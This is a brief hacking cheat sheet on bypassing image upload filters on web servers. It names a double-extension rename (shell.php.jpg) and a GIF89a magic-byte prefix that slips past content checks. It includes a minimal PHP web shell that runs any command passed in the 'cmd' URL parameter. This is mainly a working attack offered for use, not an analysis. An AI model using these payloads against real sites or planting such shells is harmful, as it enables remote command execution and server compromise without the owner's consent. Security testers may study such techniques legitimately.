# Bypass image upload


## Rename it

But instead we can just rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as php.

## GIF89a;
If they check the content.
Basically you just add the text "GIF89a;" before you shell-code. So it would look something like this:

```
GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
```